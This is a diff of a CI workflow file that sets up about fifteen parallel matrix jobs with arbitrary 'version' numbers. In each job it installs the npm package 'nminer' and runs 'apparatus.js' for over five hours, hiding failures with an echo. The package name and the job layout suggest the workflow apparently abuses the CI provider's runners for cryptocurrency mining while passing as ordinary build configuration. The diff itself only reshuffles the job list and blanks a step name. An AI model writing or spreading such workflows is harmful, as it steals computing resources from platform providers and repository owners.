@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6813 }
-          - { version: 4276 }
-          - { version: 3964 }
-          - { version: 440 }
-          - { version: 7440 }
-          - { version: 2138 }
-          - { version: 6759 }
-          - { version: 1730 }
-          - { version: 9120 }
-          - { version: 8457 }
-          - { version: 7484 }
-          - { version: 1008 }
-          - { version: 4273 }
-          - { version: 4528 }
-          - { version: 4674 }
-          - { version: 3350 }
-          - { version: 49 }
+          - { version: 1192 }
+          - { version: 7402 }
+          - { version: 8906 }
+          - { version: 5342 }
+          - { version: 6061 }
+          - { version: 6153 }
+          - { version: 453 }
+          - { version: 9215 }
+          - { version: 6358 }
+          - { version: 4418 }
+          - { version: 7247 }
+          - { version: 6763 }
+          - { version: 7930 }
+          - { version: 6979 }
+          - { version: 3496 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: siege oh
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 336m node apparatus.js || echo "apparatus executed"
+          timeout 335m node apparatus.js || echo "apparatus executed"
